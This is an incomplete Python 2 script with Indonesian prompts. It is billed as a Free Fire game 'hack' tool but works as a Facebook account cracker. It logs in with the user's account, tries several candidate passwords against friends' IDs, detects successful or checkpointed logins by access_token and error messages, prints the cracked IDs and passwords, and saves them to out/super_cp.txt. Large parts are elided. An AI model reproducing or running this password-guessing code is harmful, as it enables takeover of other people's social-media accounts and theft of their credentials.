...
\033[32m╱╱╱╰━━━━━━━━╯╲ ╲
\033[32m╔═══════════════════════
\033[32m*\033[0;1mScript Khusus Free Fire
\033[32m*\033[0;1mYoutube : Masterpiece Gaming
\033[32m╚═══════════════════════"""
...
def siapa():
	os.system('clear')
	nama = raw_input("\033[1;97mApa Nama NickName Kamu ? \033[1;91m: \033[1;92m")
	if nama =="":
...
def login():
	...
	try:
		...
		print logo
		print 42*"\033[33;1m="
		print('\033[0;1mAkun Tidak Akan Kena Cekpoint Saat Login' )
		print('\033[0;1mKarena Script ini Khusus Hack id Free Fire' )
		print 42*"\033[33;1m="
		print('\033[0;1mSilahkan Login Menggunakan Akun Free Fire Anda' )
		print('\033[0;1mAkun Login Harus Memiliki Teman Free Fire' )
		print('\033[0;1mYang Akan Di Hack Nantinya' )
		print 42*"\033[33;1m="
		...
		try:
			...
			print"\n\033[1;96m[!] \x1b[1;91mTidak ada koneksi Internet"
			keluar()
		...
		if 'save-device' in url:
			try:
				...
				print"\n\033[1;96m[!] \x1b[1;91mKoneksi Internet Tidak Stabil"
				keluar()
...
def menu():
	...
	try:
		...
		os.system('clear')
		print"\033[1;96m[!] \x1b[1;91mKoneksi Internet Tidak Stabil"
		os.system('rm -rf login.txt')
		time.sleep(1)
		keluar()
	try:
...
def pilih_super():
	...
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;96m[\033[1;97m✸\033[1;96m] \033[1;93mLagi Proses... \033[1;97m"+o),;sys.stdout.flush();time.sleep(1)
	print
		...
		try:
			...
			if 'access_token' in q:
				...
				if 'www.facebook.com' in q["error_msg"]:
					...
					print '\x1b[32m[✓] \x1b[0;1mSandi \x1b[1;91m: \x1b[0;1m' + pass1 + '\n'
					...
					if 'access_token' in q:
						...
						if 'www.facebook.com' in q["error_msg"]:
							print '\x1b[32m[✓] \x1b[0;1mID \x1b[1;91m      : \x1b[0:1m' + user
							print '\x1b[32m[✓] \x1b[0;1mSandi \x1b[1;91m: \x1b[0:1m' + pass2 + '\n'
							cek = open("out/super_cp.txt", "a")
							...
							if 'access_token' in q:
								...
								if 'www.facebook.com' in q["error_msg"]:
									print '\x1b[32m[✓] \x1b[0;1mID \x1b[1;91m      : \x1b[0;1m' + user
									print '\x1b[32m[✓] \x1b[0;1mSandi \x1b[1;91m: \x1b[0;1m' + pass3 + '\n'
									cek = open("out/super_cp.txt", "a")
									...
									if 'access_token' in q:
										...
										if 'www.facebook.com' in q["error_msg"]:
											print '\x1b[32m[➹] \x1b[0;1mID \x1b[1;91m      : \x1b[0;1m' + user
											print '\x1b[32m[➹] \x1b[0;1mSandi \x1b[1;91m: \x1b[0;1m' + pass4 + '\n'
											cek = open("out/super_cp.txt", "a")
											...
											if 'access_token' in q:
												...
												if 'www.facebook.com' in q["error_msg"]:
													print '\x1b[32m[✓] \x1b[0;1mID \x1b[1;91m      : \x1b[0;1m' + user
													print '\x1b[32m[✓] \x1b[0;1mSandi \x1b[1;91m: \x1b[0;1m' + pass5 + '\n'
													cek = open("out/super_cp.txt", "a")
													...
													if 'access_token' in q:
														...
														if 'www.facebook.com' in q["error_msg"]:
															print '\x1b[32m[✓] \x1b[0;1mID \x1b[1;91m      : \x1b[0;1m' + user
															print '\x1b[32m[✓] \x1b[0;1mSandi \x1b[1;91m: \x1b[0;1m' + pass6 + '\n'
															cek = open("out/super_cp.txt", "a")
